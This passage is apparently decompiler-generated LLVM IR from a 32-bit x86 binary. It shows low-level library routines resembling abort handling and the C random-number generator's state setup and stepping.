dec_label_pc_804e8b9:                             ; preds = %dec_label_pc_804e725, %dec_label_pc_804e8a8
  %.0 = phi i32 [ undef, %dec_label_pc_804e725 ], [ %v2_804e8b1, %dec_label_pc_804e8a8 ]
  store i32 %v0_804e728, i32* @ebx, align 4
  store i32 %v0_804e727, i32* @esi, align 4
  store i32 %v0_804e726, i32* @edi, align 4
  store i32 %v0_804e725, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804e888, { 1, 0 }
  uselistorder i32 %v0_804e81d, { 1, 0 }
  uselistorder i32 %v1_804e7e8, { 1, 0 }
  uselistorder i32 %v2_804e7e1, { 1, 0 }
  uselistorder i32 %v1_804e7d6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804e7e5, { 1, 0 }
  uselistorder i32 %v1_804e769, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804e764, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804e759, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80589e0.141 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8058a14.144 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8058a0c.142, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804e8b9, { 1, 0 }
  uselistorder label %dec_label_pc_804e8a8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804e864, { 1, 0 }
  uselistorder label %dec_label_pc_804e843, { 1, 0 }
  uselistorder label %dec_label_pc_804e80e, { 1, 0 }
  uselistorder label %dec_label_pc_804e806, { 1, 0 }
  uselistorder label %dec_label_pc_804e7d2, { 1, 0 }
}

define i32 @function_804e8c1(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e8c1:
  %v0_804e8c1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804e8ce = call i32 @function_804e57d(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80589e0.141 to i8) to i32) to i32*))
  %v0_804e8d3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8d3, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* @edx, align 4
  store i32 %v0_804e8c1, i32* @ebx, align 4
  %v0_804e8de = call i32 @function_804e4f0()
  ret i32 %v0_804e8de

; uselistorder directives
  uselistorder i32 ()* @function_804e4f0, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80589e0.141 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80589e0.141, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @function_804e8e4() local_unnamed_addr {
dec_label_pc_804e8e4:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804e8f0 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055f88.161 to i32))
  %v12_804e8fa = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8ff

dec_label_pc_804e8ff:                             ; preds = %dec_label_pc_804e8ff.dec_label_pc_804e8ff_crit_edge, %dec_label_pc_804e8e4
  %v0_804e8ff = phi i32 [ %v12_804e8fa, %dec_label_pc_804e8e4 ], [ %v0_804e8ff.pre, %dec_label_pc_804e8ff.dec_label_pc_804e8ff_crit_edge ]
  %v1_804e90a22 = phi i32 [ 31, %dec_label_pc_804e8e4 ], [ %v1_804e90a, %dec_label_pc_804e8ff.dec_label_pc_804e8ff_crit_edge ]
  %v2_804e8ff = mul i32 %v1_804e90a22, 4
  %v3_804e8ff = add i32 %v2_804e8ff, 152
  %v4_804e8ff = add i32 %v3_804e8ff, %v0_804e8ff
  %v5_804e8ff = inttoptr i32 %v4_804e8ff to i32*
  store i32 0, i32* %v5_804e8ff, align 4
  %v0_804e90a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e90a = add i32 %v0_804e90a.pre, -1
  %v9_804e90a = icmp slt i32 %v1_804e90a, 0
  store i32 %v1_804e90a, i32* %eax.global-to-local, align 4
  %v1_804e90b = icmp eq i1 %v9_804e90a, false
  br i1 %v1_804e90b, label %dec_label_pc_804e8ff.dec_label_pc_804e8ff_crit_edge, label %dec_label_pc_804e90d

dec_label_pc_804e8ff.dec_label_pc_804e8ff_crit_edge: ; preds = %dec_label_pc_804e8ff
  %v0_804e8ff.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8ff

dec_label_pc_804e90d:                             ; preds = %dec_label_pc_804e8ff
  %v0_804e90d = load i32, i32* @ebx, align 4
  %v2_804e911 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e911, i32* @ebx, align 4
  %v4_804e919 = call i32 @function_8051294(i32 %v2_804e911, i32 6, i32 %v0_804e90d, i32 %v0_804e90d)
  store i32 %v4_804e919, i32* %eax.global-to-local, align 4
  %v1_804e921 = icmp eq i32 %v4_804e919, 0
  %v1_804e923 = icmp eq i1 %v1_804e921, false
  br i1 %v1_804e923, label %dec_label_pc_804e933, label %dec_label_pc_804e925

dec_label_pc_804e925:                             ; preds = %dec_label_pc_804e90d
  %v3_804e92b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804e92b = call i32 @function_804fa50(i32 1, %_TYPEDEF_sigset_t* %v3_804e92b, i32 0)
  store i32 %v4_804e92b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e933

dec_label_pc_804e933:                             ; preds = %dec_label_pc_804e90d, %dec_label_pc_804e925
  %v2_804e96b4 = phi i32 [ %v4_804e919, %dec_label_pc_804e90d ], [ %v4_804e92b, %dec_label_pc_804e925 ]
  %v0_804e933 = load i8, i8* @global_var_8058740.162, align 64
  %v1_804e933 = icmp eq i8 %v0_804e933, 0
  %v1_804e93a = icmp eq i1 %v1_804e933, false
  br i1 %v1_804e93a, label %dec_label_pc_804e96b, label %dec_label_pc_804e93c

dec_label_pc_804e93c:                             ; preds = %dec_label_pc_804e933
  store i8 1, i8* @global_var_8058740.162, align 64
  br label %dec_label_pc_804e943

dec_label_pc_804e943:                             ; preds = %dec_label_pc_804e9aa, %dec_label_pc_804e93c
  %v1_804e94b = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055f88.161 to i32))
  store i32 %v1_804e94b, i32* %eax.global-to-local, align 4
  %v1_804e957 = call i32 @function_8051258(i32 6)
  store i32 %v1_804e957, i32* %eax.global-to-local, align 4
  %v1_804e963 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055f88.161 to i32))
  store i32 %v1_804e963, i32* %eax.global-to-local, align 4
  %v0_804e96b.pre = load i8, i8* @global_var_8058740.162, align 64
  br label %dec_label_pc_804e96b

dec_label_pc_804e96b:                             ; preds = %dec_label_pc_804e933, %dec_label_pc_804e943
  %v2_804e96b = phi i32 [ %v2_804e96b4, %dec_label_pc_804e933 ], [ %v1_804e963, %dec_label_pc_804e943 ]
  %v0_804e96b = phi i8 [ %v0_804e933, %dec_label_pc_804e933 ], [ %v0_804e96b.pre, %dec_label_pc_804e943 ]
  %v1_804e96b = zext i8 %v0_804e96b to i32
  %v3_804e96b = and i32 %v2_804e96b, -256
  %v4_804e96b = or i32 %v1_804e96b, %v3_804e96b
  store i32 %v4_804e96b, i32* %eax.global-to-local, align 4
  %v10_804e970 = icmp eq i8 %v0_804e96b, 1
  %v1_804e972 = icmp eq i1 %v10_804e970, false
  br i1 %v1_804e972, label %dec_label_pc_804e9cc, label %dec_label_pc_804e974

dec_label_pc_804e974:                             ; preds = %dec_label_pc_804e96b
  store i8 2, i8* @global_var_8058740.162, align 64
  %v2_804e983 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804e983, i32* %eax.global-to-local, align 4
  %v3_804e988 = bitcast i32* %stack_var_-272 to i8*
  %v4_804e988 = call i32 @function_804d178(i8* %v3_804e988, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e99f

dec_label_pc_804e99f:                             ; preds = %dec_label_pc_804e99f.dec_label_pc_804e99f_crit_edge, %dec_label_pc_804e974
  %v0_804e99f = phi i32 [ %v12_804e8fa, %dec_label_pc_804e974 ], [ %v0_804e99f.pre, %dec_label_pc_804e99f.dec_label_pc_804e99f_crit_edge ]
  %v1_804e9a721 = phi i32 [ 31, %dec_label_pc_804e974 ], [ %v1_804e9a7, %dec_label_pc_804e99f.dec_label_pc_804e99f_crit_edge ]
  %v2_804e99f = mul i32 %v1_804e9a721, 4
  %v3_804e99f = add i32 %v2_804e99f, 16
  %v4_804e99f = add i32 %v3_804e99f, %v0_804e99f
  %v5_804e99f = inttoptr i32 %v4_804e99f to i32*
  store i32 -1, i32* %v5_804e99f, align 4
  %v0_804e9a7.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804e9a7 = add i32 %v0_804e9a7.pre, -1
  %v9_804e9a7 = icmp slt i32 %v1_804e9a7, 0
  store i32 %v1_804e9a7, i32* %eax.global-to-local, align 4
  %v1_804e9a8 = icmp eq i1 %v9_804e9a7, false
  br i1 %v1_804e9a8, label %dec_label_pc_804e99f.dec_label_pc_804e99f_crit_edge, label %dec_label_pc_804e9aa

dec_label_pc_804e99f.dec_label_pc_804e99f_crit_edge: ; preds = %dec_label_pc_804e99f
  %v0_804e99f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e99f

dec_label_pc_804e9aa:                             ; preds = %dec_label_pc_804e99f
  store i32 %v2_804e983, i32* %eax.global-to-local, align 4
  %v5_804e9bf = call i32 @function_804f4eb(i32 6, i32* nonnull %stack_var_-272, i32 0, i32 %v1_804e9a7)
  store i32 %v5_804e9bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e943

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e96b
  %v10_804e9cc = icmp eq i8 %v0_804e96b, 2
  %v1_804e9ce = icmp eq i1 %v10_804e9cc, false
  br i1 %v1_804e9ce, label %dec_label_pc_804e9d8, label %dec_label_pc_804e9d8.thread

dec_label_pc_804e9d8.thread:                      ; preds = %dec_label_pc_804e9cc
  store i8 3, i8* @global_var_8058740.162, align 64
  br label %dec_label_pc_804e9e1

dec_label_pc_804e9d8:                             ; preds = %dec_label_pc_804e9cc
  %v9_804e9d8 = icmp eq i8 %v0_804e96b, 3
  %v1_804e9df = icmp eq i1 %v9_804e9d8, false
  br i1 %v1_804e9df, label %dec_label_pc_804e9f2, label %dec_label_pc_804e9e1

dec_label_pc_804e9e1:                             ; preds = %dec_label_pc_804e9d8.thread, %dec_label_pc_804e9d8
  store i8 4, i8* @global_var_8058740.162, align 64
  %v1_804e9ed = call i32 @function_804f700(i32 127)
  unreachable

dec_label_pc_804e9f2:                             ; preds = %dec_label_pc_804e9d8, %dec_label_pc_804e9f2
  br label %dec_label_pc_804e9f2

; uselistorder directives
  uselistorder i32 %v1_804e9a7, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e90a, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8* @global_var_8058740.162, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e9f2, { 1, 0 }
  uselistorder label %dec_label_pc_804e9e1, { 1, 0 }
  uselistorder label %dec_label_pc_804e96b, { 1, 0 }
  uselistorder label %dec_label_pc_804e933, { 1, 0 }
}

define i32 @function_804e9f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e9f8:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ea00 = load i32, i32* @ebx, align 4
  store i32 %v0_804ea00, i32* %stack_var_-4, align 4
  %v2_804ea0e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ea0e, i32* @ebx, align 4
  %v2_804ea13 = call i32 @function_804f2ae(i32 %v2_804ea0e, i32 134541995)
  %v1_804ea1f = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055fa0.163 to i32))
  %v2_804ea26 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804ea30 = call i32 @function_804ebd9(i32* nonnull @global_var_8055fb8, i32 %v2_804ea26)
  store i32 ptrtoint (i32* @global_var_8055fb8 to i32), i32* @eax, align 4
  store i32 %v2_804ea26, i32* @edx, align 4
  %v2_804ea3a = call i32 @function_804f2ae(i32 %v2_804ea0e, i32 1)
  %v3_804ea3f = load i32, i32* %stack_var_-8, align 4
  %v2_804ea46 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ea46, i32* @ebx, align 4
  ret i32 %v3_804ea3f
}

define i32 @function_804ea48(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ea48:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804ea59 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ea59, i32* @eax, align 4
  %v2_804ea5e = call i32 @function_804f2ae(i32 %v2_804ea59, i32 134541995)
  %v1_804ea6a = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055fa0.163 to i32))
  %v0_804ea76 = load i32, i32* bitcast (i32** @global_var_8055fc0.166 to i32*), align 64
  store i32 %v0_804ea76, i32* @ebx, align 4
  %v3_804ea80 = call i32 @function_804eb40(i32 %arg1, i32* nonnull @global_var_8055fb8)
  %v2_804ea88 = icmp slt i32 %v3_804ea80, 0
  br i1 %v2_804ea88, label %dec_label_pc_804ea8f, label %dec_label_pc_804ea8c

dec_label_pc_804ea8c:                             ; preds = %dec_label_pc_804ea48
  store i32 ptrtoint (i32** @global_var_8055fbc.167 to i32), i32* @esi, align 4
  br label %dec_label_pc_804ea8f

dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea48, %dec_label_pc_804ea8c
  store i32 %v2_804ea59, i32* @eax, align 4
  %v2_804ea98 = call i32 @function_804f2ae(i32 %v2_804ea59, i32 1)
  %v0_804ea9d = load i32, i32* @esi, align 4
  ret i32 %v0_804ea9d

; uselistorder directives
  uselistorder label %dec_label_pc_804ea8f, { 1, 0 }
}

define i32 @function_804eaa5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804eaa5:
  %stack_var_-24 = alloca i32, align 4
  %v2_804eab4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804eab4, i32* @ebx, align 4
  %v2_804eab9 = call i32 @function_804f2ae(i32 %v2_804eab4, i32 134541995)
  %v1_804eac5 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055fa0.163 to i32))
  %v0_804eacf = load i32, i32* bitcast (i32** @global_var_8055fc0.166 to i32*), align 64
  store i32 %v0_804eacf, i32* @esi, align 4
  %v4_804eae1 = inttoptr i32 %arg2 to i32*
  %v5_804eae1 = call i32 @function_804ecce(i32 %arg1, i32* %v4_804eae1, i32 %arg3, i32 ptrtoint (i32* @global_var_8055fb8 to i32))
  store i32 %v5_804eae1, i32* @eax, align 4
  %v2_804eaec = call i32 @function_804f2ae(i32 %v2_804eab4, i32 1)
  ret i32 ptrtoint (i32** @global_var_8055fbc.167 to i32)
}

define i32 @function_804eafc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804eafc:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804eafc = load i32, i32* @ebx, align 4
  store i32 %v0_804eafc, i32* %stack_var_-4, align 4
  %v2_804eb0a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804eb0a, i32* @ebx, align 4
  %v2_804eb0f = call i32 @function_804f2ae(i32 %v2_804eb0a, i32 134541995)
  %v1_804eb1b = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055fa0.163 to i32))
  %v2_804eb2b = sext i32 %arg1 to i64
  %v3_804eb2b = call i32 @function_804ec38(i64 %v2_804eb2b, i32 ptrtoint (i32* @global_var_8055fb8 to i32))
  store i32 ptrtoint (i32* @global_var_8055fb8 to i32), i32* @eax, align 4
  %v2_804eb35 = call i32 @function_804f2ae(i32 %v2_804eb0a, i32 1)
  %v2_804eb3d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804eb3d, i32* @ebx, align 4
  ret i32 %v2_804eb35

; uselistorder directives
  uselistorder i32* @global_var_8055fb8, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055fb8 to i32), { 1, 3, 2, 0 }
}

define i32 @function_804eb40(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804eb40:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_804eb43 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_804eb4f = add i32 %arg1, 4
  store i32 %v1_804eb4f, i32* %esi.global-to-local, align 4
  %v1_804eb52 = add i32 %tmp4, 12
  %v2_804eb52 = inttoptr i32 %v1_804eb52 to i32*
  %v3_804eb52 = load i32, i32* %v2_804eb52, align 4
  store i32 %v3_804eb52, i32* %ecx.global-to-local, align 4
  %v1_804eb55 = add i32 %tmp4, 8
  %v2_804eb55 = inttoptr i32 %v1_804eb55 to i32*
  %v3_804eb55 = load i32, i32* %v2_804eb55, align 4
  %v1_804eb58 = icmp eq i32 %v3_804eb52, 0
  %v1_804eb5a = icmp eq i1 %v1_804eb58, false
  br i1 %v1_804eb5a, label %dec_label_pc_804eb65, label %dec_label_pc_804eb5c

dec_label_pc_804eb5c:                             ; preds = %dec_label_pc_804eb40
  %v1_804eb5c = add i32 %v3_804eb55, -4
  %v2_804eb5c = inttoptr i32 %v1_804eb5c to i32*
  store i32 0, i32* %v2_804eb5c, align 4
  br label %dec_label_pc_804eb75

dec_label_pc_804eb65:                             ; preds = %dec_label_pc_804eb40
  %v1_804eb65 = add i32 %tmp4, 4
  %v2_804eb65 = inttoptr i32 %v1_804eb65 to i32*
  %v3_804eb65 = load i32, i32* %v2_804eb65, align 4
  %v2_804eb68 = sub i32 %v3_804eb65, %v3_804eb55
  %v2_804eb6a = sdiv i32 %v2_804eb68, 4
  %v3_804eb6d = mul i32 %v2_804eb6a, 5
  %v2_804eb70 = add i32 %v3_804eb6d, %v3_804eb52
  store i32 %v2_804eb70, i32* %eax.global-to-local, align 4
  %v2_804eb72 = add i32 %v3_804eb55, -4
  %v3_804eb72 = inttoptr i32 %v2_804eb72 to i32*
  store i32 %v2_804eb70, i32* %v3_804eb72, align 4
  br label %dec_label_pc_804eb75

dec_label_pc_804eb75:                             ; preds = %dec_label_pc_804eb5c, %dec_label_pc_804eb65
  %v0_804eb75 = load i32, i32* %esi.global-to-local, align 4
  %v1_804eb75 = add i32 %v0_804eb75, -4
  %v2_804eb75 = inttoptr i32 %v1_804eb75 to i32*
  %v3_804eb75 = load i32, i32* %v2_804eb75, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804eb7d = ashr i32 %v3_804eb75, 31
  %v2_804eb7e = zext i32 %v3_804eb75 to i64
  %v4_804eb7e = zext i32 %v1_804eb7d to i64
  %v5_804eb7e = mul nuw i64 %v4_804eb7e, 4294967296
  %v6_804eb7e = or i64 %v5_804eb7e, %v2_804eb7e
  %v8_804eb7e = sdiv i64 %v6_804eb7e, 5
  %v9_804eb7e = trunc i64 %v8_804eb7e to i32
  store i32 %v9_804eb7e, i32* %eax.global-to-local, align 4
  %v10_804eb7e = srem i64 %v6_804eb7e, 5
  %v11_804eb7e = trunc i64 %v10_804eb7e to i32
  %v6_804eb83 = icmp ugt i32 %v11_804eb7e, 4
  br i1 %v6_804eb83, label %dec_label_pc_804ebc3, label %dec_label_pc_804eb85

dec_label_pc_804eb85:                             ; preds = %dec_label_pc_804eb75
  %v1_804eb85 = mul i32 %v11_804eb7e, 4
  %v2_804eb85 = add i32 %v1_804eb85, ptrtoint (i32* @global_var_80542f4.168 to i32)
  %v3_804eb85 = inttoptr i32 %v2_804eb85 to i32*
  %v4_804eb85 = load i32, i32* %v3_804eb85, align 4
  store i32 %v4_804eb85, i32* %ecx.global-to-local, align 4
  %v2_804eb8c = add i32 %v1_804eb85, ptrtoint (i32* @global_var_80542e0.169 to i32)
  %v3_804eb8c = inttoptr i32 %v2_804eb8c to i32*
  %v4_804eb8c = load i32, i32* %v3_804eb8c, align 4
  store i32 %v4_804eb8c, i32* %ebp.global-to-local, align 4
  %v1_804eb93 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb93 = add i32 %v1_804eb93, 16
  %v3_804eb93 = inttoptr i32 %v2_804eb93 to i32*
  store i32 %v4_804eb85, i32* %v3_804eb93, align 4
  %v0_804eb96 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804eb96 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb96 = add i32 %v1_804eb96, 20
  %v3_804eb96 = inttoptr i32 %v2_804eb96 to i32*
  store i32 %v0_804eb96, i32* %v3_804eb96, align 4
  %v1_804eb99 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb99 = add i32 %v1_804eb99, 12
  %v3_804eb99 = inttoptr i32 %v2_804eb99 to i32*
  store i32 %v11_804eb7e, i32* %v3_804eb99, align 4
  %v1_804eb9c = icmp eq i32 %v11_804eb7e, 0
  br i1 %v1_804eb9c, label %dec_label_pc_804ebb6, label %dec_label_pc_804eba0

dec_label_pc_804eba0:                             ; preds = %dec_label_pc_804eb85
  %v0_804eba0 = load i32, i32* %esi.global-to-local, align 4
  %v1_804eba0 = add i32 %v0_804eba0, -4
  %v2_804eba0 = inttoptr i32 %v1_804eba0 to i32*
  %v3_804eba0 = load i32, i32* %v2_804eba0, align 4
  %v1_804eba3 = ashr i32 %v3_804eba0, 31
  %v0_804eba4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804eba4 = zext i32 %v3_804eba0 to i64
  %v4_804eba4 = zext i32 %v1_804eba3 to i64
  %v5_804eba4 = mul nuw i64 %v4_804eba4, 4294967296
  %v6_804eba4 = or i64 %v5_804eba4, %v2_804eba4
  %v7_804eba4 = zext i32 %v0_804eba4 to i64
  %v8_804eba4 = sdiv i64 %v6_804eba4, %v7_804eba4
  %v9_804eba4 = trunc i64 %v8_804eba4 to i32
  %v2_804eba6 = mul i32 %v9_804eba4, 4
  %v3_804eba6 = add i32 %v2_804eba6, %v0_804eba0
  %v1_804eba9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804eba9 = add i32 %v1_804eba9, %v9_804eba4
  store i32 %v2_804eba9, i32* %eax.global-to-local, align 4
  %v1_804ebab = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebab = add i32 %v1_804ebab, 4
  %v3_804ebab = inttoptr i32 %v2_804ebab to i32*
  store i32 %v3_804eba6, i32* %v3_804ebab, align 4
  %v0_804ebae = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebae = ashr i32 %v0_804ebae, 31
  %v0_804ebaf = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ebaf = zext i32 %v0_804ebae to i64
  %v4_804ebaf = zext i32 %v1_804ebae to i64
  %v5_804ebaf = mul nuw i64 %v4_804ebaf, 4294967296
  %v6_804ebaf = or i64 %v5_804ebaf, %v2_804ebaf
  %v7_804ebaf = zext i32 %v0_804ebaf to i64
  %v8_804ebaf = sdiv i64 %v6_804ebaf, %v7_804ebaf
  %v9_804ebaf = trunc i64 %v8_804ebaf to i32
  store i32 %v9_804ebaf, i32* %eax.global-to-local, align 4
  %v10_804ebaf = srem i64 %v6_804ebaf, %v7_804ebaf
  %v11_804ebaf = trunc i64 %v10_804ebaf to i32
  %v0_804ebb1 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ebb1 = mul i32 %v11_804ebaf, 4
  %v3_804ebb1 = add i32 %v2_804ebb1, %v0_804ebb1
  %v1_804ebb4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebb4 = inttoptr i32 %v1_804ebb4 to i32*
  store i32 %v3_804ebb1, i32* %v2_804ebb4, align 4
  br label %dec_label_pc_804ebb6

dec_label_pc_804ebb6:                             ; preds = %dec_label_pc_804eb85, %dec_label_pc_804eba0
  %v0_804ebb6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ebb6 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ebb6 = mul i32 %v1_804ebb6, 4
  %v3_804ebb6 = add i32 %v2_804ebb6, %v0_804ebb6
  store i32 %v3_804ebb6, i32* %eax.global-to-local, align 4
  %v1_804ebb9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebb9 = add i32 %v1_804ebb9, 8
  %v3_804ebb9 = inttoptr i32 %v2_804ebb9 to i32*
  store i32 %v0_804ebb6, i32* %v3_804ebb9, align 4
  %v0_804ebbc = load i32, i32* %eax.global-to-local, align 4
  %v1_804ebbc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebbc = add i32 %v1_804ebbc, 24
  %v3_804ebbc = inttoptr i32 %v2_804ebbc to i32*
  store i32 %v0_804ebbc, i32* %v3_804ebbc, align 4
  br label %dec_label_pc_804ebd1

dec_label_pc_804ebc3:                             ; preds = %dec_label_pc_804eb75
  %v1_804ebc3 = call i32 @function_804b774(i32 %v0_804eb43)
  store i32 %v1_804ebc3, i32* %eax.global-to-local, align 4
  %v1_804ebc8 = inttoptr i32 %v1_804ebc3 to i32*
  store i32 22, i32* %v1_804ebc8, align 4
  br label %dec_label_pc_804ebd1

dec_label_pc_804ebd1:                             ; preds = %dec_label_pc_804ebb6, %dec_label_pc_804ebc3
  %storemerge = phi i32 [ -1, %dec_label_pc_804ebc3 ], [ 0, %dec_label_pc_804ebb6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb43, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804ebb6, { 1, 0 }
  uselistorder i32 %v11_804eb7e, { 3, 1, 2, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ebd1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebb6, { 1, 0 }
  uselistorder label %dec_label_pc_804eb75, { 1, 0 }
}

define i32 @function_804ebd9(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ebd9:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804ebdc = load i32, i32* @ebx, align 4
  store i32 %v0_804ebdc, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804ebe5 = add i32 %tmp2, 8
  %v2_804ebe5 = inttoptr i32 %v1_804ebe5 to i32*
  %v3_804ebe5 = load i32, i32* %v2_804ebe5, align 4
  store i32 %v3_804ebe5, i32* %esi.global-to-local, align 4
  %v1_804ebe8 = add i32 %tmp2, 12
  %v2_804ebe8 = inttoptr i32 %v1_804ebe8 to i32*
  %v3_804ebe8 = load i32, i32* %v2_804ebe8, align 4
  %v4_804ebe8 = icmp eq i32 %v3_804ebe8, 0
  %v1_804ebec = icmp eq i1 %v4_804ebe8, false
  br i1 %v1_804ebec, label %dec_label_pc_804ec05, label %dec_label_pc_804ebee

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804ebd9
  %v2_804ebee = inttoptr i32 %v3_804ebe5 to i32*
  %v3_804ebee = load i32, i32* %v2_804ebee, align 4
  %v5_804ebee = mul i32 %v3_804ebee, 1103515245
  %v1_804ebf4 = add i32 %v5_804ebee, 12345
  %v1_804ebf9 = urem i32 %v1_804ebf4, -2147483648
  store i32 %v1_804ebf9, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebf9, i32* %v2_804ebee, align 4
  %v0_804ec00 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec00 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ec00 = inttoptr i32 %v1_804ec00 to i32*
  store i32 %v0_804ec00, i32* %v2_804ec00, align 4
  br label %dec_label_pc_804ec31

dec_label_pc_804ec05:                             ; preds = %dec_label_pc_804ebd9
  %v1_804ec05 = add i32 %tmp2, 4
  %v2_804ec05 = inttoptr i32 %v1_804ec05 to i32*
  %v3_804ec05 = load i32, i32* %v2_804ec05, align 4
  store i32 %v3_804ec05, i32* %ecx.global-to-local, align 4
  %v2_804ec08 = load i32, i32* %arg1, align 4
  store i32 %v2_804ec08, i32* %edx.global-to-local, align 4
